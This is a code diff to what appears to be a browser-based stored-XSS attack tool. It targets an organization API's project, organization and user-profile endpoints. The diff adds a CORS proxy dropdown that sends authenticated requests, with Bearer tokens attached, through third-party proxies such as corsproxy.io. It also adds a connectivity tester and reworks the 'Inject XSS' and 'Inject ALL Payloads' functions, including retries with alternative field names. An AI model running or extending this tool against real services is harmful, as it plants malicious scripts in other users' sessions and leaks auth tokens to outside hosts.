@@ -431,15 +431,25 @@
                     <textarea id="xssCustomPayload" placeholder='Leave empty to use selected payload, or type your own XSS payload here'></textarea>
                 </div>
                 <div style="display:flex;gap:8px;flex-wrap:wrap;">
+                    <button class="btn btn-outline" onclick="testAPIConnection()" id="testConnBtn" style="background:#1a3a1a;color:#86efac;">Test API Connection</button>
                     <button class="btn btn-primary" onclick="injectXSS()" id="xssBtn">Inject XSS Payload</button>
                     <button class="btn btn-danger" onclick="injectAllPayloads()">Inject ALL Payloads</button>
                     <button class="btn btn-outline" onclick="testXSSReflection()">Test Reflection First</button>
+                </div>
+                <div class="input-group" style="margin-top:12px;">
+                    <label>CORS Proxy (if direct fetch fails):</label>
+                    <select id="corsProxy">
+                        <option value="">Direct (no proxy)</option>
+                        <option value="https://corsproxy.io/?">corsproxy.io</option>
+                        <option value="https://api.allorigins.win/raw?url=">allorigins.win</option>
+                        <option value="https://cors-anywhere.herokuapp.com/">cors-anywhere</option>
+                    </select>
                 </div>
             </div>
             <div class="card">
                 <h3>XSS Injection Log</h3>
                 <div class="console" id="xssLog">
-                    <div class="log-info">[XSS] Select a payload and target, then inject.</div>
+                    <div class="log-info">[XSS] Click "Test API Connection" first to verify connectivity.</div>
                 </div>
             </div>
         </div>
@@ -1009,6 +1019,142 @@
                 val === 'world-update' ? 'block' : 'none';
         });
 
+        // =====================================================
+        // CORS PROXY AWARE FETCH
+        // =====================================================
+        function getApiUrl(endpoint) {
+            const proxy = document.getElementById('corsProxy')?.value || '';
+            const fullUrl = `${API}/${endpoint}`;
+            if (proxy) {
+                return proxy + encodeURIComponent(fullUrl);
+            }
+            return fullUrl;
+        }
+
+        async function corsFetch(endpoint, options = {}) {
+            const proxy = document.getElementById('corsProxy')?.value || '';
+            const fullUrl = `${API}/${endpoint}`;
+
+            // Build headers
+            const headers = {
+                'Authorization': `Bearer ${idToken}`,
+                'Content-Type': 'application/json',
+                ...(options.headers || {})
+            };
+
+            // Try direct fetch first
+            if (!proxy) {
+                try {
+                    const resp = await fetch(fullUrl, { ...options, headers });
+                    return resp;
+                } catch(e) {
+                    log('xssLog', `[CORS] Direct fetch failed: ${e.message}`, 'warning');
+                    log('xssLog', `[CORS] Trying CORS proxy automatically...`, 'warning');
+                    // Auto-fallback to corsproxy.io
+                    const proxyUrl = 'https://corsproxy.io/?' + encodeURIComponent(fullUrl);
+                    const resp = await fetch(proxyUrl, { ...options, headers });
+                    return resp;
+                }
+            }
+
+            // Use selected proxy
+            const proxyUrl = proxy + encodeURIComponent(fullUrl);
+            const resp = await fetch(proxyUrl, { ...options, headers });
+            return resp;
+        }
+
+        // =====================================================
+        // TEST API CONNECTION
+        // =====================================================
+        async function testAPIConnection() {
+            log('xssLog', '[TEST] Testing API connectivity...', 'info');
+
+            // Test 1: Simple GET without auth (should work - CORS *)
+            log('xssLog', '[TEST] 1. GET /organizations/current (no auth)...', 'info');
+            try {
+                const resp = await fetch(`${API}/organizations/current`);
+                if (resp.ok) {
+                    const data = await resp.json();
+                    log('xssLog', `[TEST] GET OK! Org: ${data.name}`, 'success');
+                } else {
+                    log('xssLog', `[TEST] GET failed: ${resp.status}`, 'error');
+                }
+            } catch(e) {
+                log('xssLog', `[TEST] GET error: ${e.message}`, 'error');
+            }
+
+            // Test 2: Authenticated GET
+            if (!idToken) {
+                log('xssLog', '[TEST] 2. SKIPPED - Not authenticated yet', 'warning');
+            } else {
+                log('xssLog', `[TEST] 2. GET /organizations/projects (with auth, token: ${idToken.substring(0,20)}...)`, 'info');
+                try {
+                    const resp = await fetch(`${API}/organizations/projects`, {
+                        headers: {
+                            'Authorization': `Bearer ${idToken}`,
+                            'Content-Type': 'application/json'
+                        }
+                    });
+                    log('xssLog', `[TEST] Auth GET status: ${resp.status}`, resp.ok ? 'success' : 'warning');
+                    if (resp.ok) {
+                        const data = await resp.json();
+                        log('xssLog', `[TEST] Auth GET works! Data: ${JSON.stringify(data).substring(0, 80)}...`, 'success');
+                    }
+                } catch(e) {
+                    log('xssLog', `[TEST] Auth GET error: ${e.message}`, 'error');
+                }
+            }
+
+            // Test 3: POST without auth (should get 401, not CORS error)
+            log('xssLog', '[TEST] 3. POST /organizations/projects (no auth - testing CORS preflight)...', 'info');
+            try {
+                const resp = await fetch(`${API}/organizations/projects`, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ name: 'connection_test' })
+                });
+                if (resp.status === 401) {
+                    log('xssLog', `[TEST] POST CORS OK! (401 = auth required, CORS passed)`, 'success');
+                } else {
+                    log('xssLog', `[TEST] POST status: ${resp.status}`, resp.status < 500 ? 'success' : 'error');
+                }
+            } catch(e) {
+                log('xssLog', `[TEST] POST CORS FAILED: ${e.message}`, 'error');
+                log('xssLog', `[TEST] Try selecting a CORS proxy from the dropdown above!`, 'warning');
+            }
+
+            // Test 4: Authenticated POST
+            if (idToken) {
+                log('xssLog', '[TEST] 4. POST /organizations/projects (with auth)...', 'info');
+                try {
+                    const resp = await fetch(`${API}/organizations/projects`, {
+                        method: 'POST',
+                        headers: {
+                            'Authorization': `Bearer ${idToken}`,
+                            'Content-Type': 'application/json'
+                        },
+                        body: JSON.stringify({ name: 'connection_test', description: 'test' })
+                    });
+                    log('xssLog', `[TEST] Auth POST status: ${resp.status}`, resp.ok ? 'success' : 'warning');
+                    if (resp.ok) {
+                        const data = await resp.json();
+                        log('xssLog', `[TEST] Auth POST works! Response: ${JSON.stringify(data).substring(0, 100)}`, 'success');
+                    } else {
+                        const errText = await resp.text().catch(() => '');
+                        log('xssLog', `[TEST] Auth POST response: ${resp.status} ${errText.substring(0, 80)}`, 'warning');
+                    }
+                } catch(e) {
+                    log('xssLog', `[TEST] Auth POST error: ${e.message}`, 'error');
+                    log('xssLog', `[TEST] Select CORS proxy and try again!`, 'warning');
+                }
+            }
+
+            log('xssLog', '[TEST] Connection test complete.', 'info');
+        }
+
+        // =====================================================
+        // INJECT XSS PAYLOAD
+        // =====================================================
         async function injectXSS() {
             if (!idToken) { log('xssLog', '[ERROR] Authenticate first!', 'error'); return; }
 
@@ -1018,7 +1164,7 @@
             const projectId = document.getElementById('xssProjectId').value;
 
             log('xssLog', `[XSS] Injecting payload into ${target}...`, 'info');
-            log('xssLog', `[XSS] Payload: ${payload.substring(0, 100)}...`, 'data');
+            log('xssLog', `[XSS] Payload: ${payload.substring(0, 80)}...`, 'data');
 
             let endpoint, method, body;
 
@@ -1066,12 +1212,8 @@
             }
 
             try {
-                const resp = await fetch(`${API}/${endpoint}`, {
+                const resp = await corsFetch(endpoint, {
                     method: method,
-                    headers: {
-                        'Authorization': `Bearer ${idToken}`,
-                        'Content-Type': 'application/json'
-                    },
                     body: body
                 });
 
@@ -1092,13 +1234,16 @@
                     });
 
                 } else {
-                    const errText = await resp.text();
+                    const errText = await resp.text().catch(() => '');
                     log('xssLog', `[-] Injection failed: ${resp.status} ${errText.substring(0, 100)}`, 'error');
-                    log('xssLog', `[RETRY] Trying alternative field names...`, 'warning');
-                    await tryAlternativeFields(endpoint, method, payload);
+                    if (resp.status === 400 || resp.status === 422) {
+                        log('xssLog', `[RETRY] Trying alternative field names...`, 'warning');
+                        await tryAlternativeFields(endpoint, method, payload);
+                    }
                 }
             } catch(e) {
                 log('xssLog', `[!] Request error: ${e.message}`, 'error');
+                log('xssLog', `[TIP] Try selecting a CORS proxy from the dropdown!`, 'warning');
             }
             updateStats();
         }
@@ -1120,12 +1265,8 @@
 
             for (const body of fieldVariants) {
                 try {
-                    const resp = await fetch(`${API}/${endpoint}`, {
+                    const resp = await corsFetch(endpoint, {
                         method: method,
-                        headers: {
-                            'Authorization': `Bearer ${idToken}`,
-                            'Content-Type': 'application/json'
-                        },
                         body: JSON.stringify(body)
                     });
 
@@ -1154,7 +1295,6 @@
             if (!idToken) { log('xssLog', '[ERROR] Authenticate first!', 'error'); return; }
             log('xssLog', '[XSS] Injecting ALL payloads across multiple endpoints...', 'warning');
 
-            // Try multiple endpoints with each payload
             const injectionTargets = [
                 { endpoint: 'organizations/projects', method: 'POST', field: 'name', desc: 'Create Project' },
                 { endpoint: 'organizations/current', method: 'PATCH', field: 'name', desc: 'Update Org Name' },
@@ -1173,12 +1313,8 @@
                     bodyObj[target.field] = p.payload;
                     if (target.method === 'POST') bodyObj.description = `Test ${p.name}`;
 
-                    const resp = await fetch(`${API}/${target.endpoint}`, {
+                    const resp = await corsFetch(target.endpoint, {
                         method: target.method,
-                        headers: {
-                            'Authorization': `Bearer ${idToken}`,
-                            'Content-Type': 'application/json'
-                        },
                         body: JSON.stringify(bodyObj)
                     });
 
@@ -1200,7 +1336,6 @@
                         const errText = await resp.text().catch(() => '');
                         log('xssLog', `[-] ${p.name}: Failed (${status}) ${errText.substring(0, 60)}`, 'error');
 
-                        // Try alternative field names
                         if (status === 400 || status === 422) {
                             log('xssLog', `[RETRY] Trying alt fields...`, 'warning');
                             await tryAlternativeFields(target.endpoint, target.method, p.payload);
@@ -1222,7 +1357,6 @@
             const testPayload = '<img src=x onerror="window.__xss_test=true">';
             log('xssLog', '[TEST] Testing XSS reflection with harmless payload...', 'info');
 
-            // Test multiple endpoints for reflection
             const testTargets = [
                 { endpoint: 'organizations/projects', method: 'POST', field: 'name', desc: 'Project Name' },
                 { endpoint: 'accounts/users/current', method: 'PATCH', field: 'displayName', desc: 'User DisplayName' },
@@ -1236,12 +1370,8 @@
                     bodyObj[t.field] = testPayload;
                     if (t.method === 'POST') bodyObj.description = 'XSS Test';
 
-                    const resp = await fetch(`${API}/${t.endpoint}`, {
+                    const resp = await corsFetch(t.endpoint, {
                         method: t.method,
-                        headers: {
-                            'Authorization': `Bearer ${idToken}`,
-                            'Content-Type': 'application/json'
-                        },
                         body: JSON.stringify(bodyObj)
                     });
 
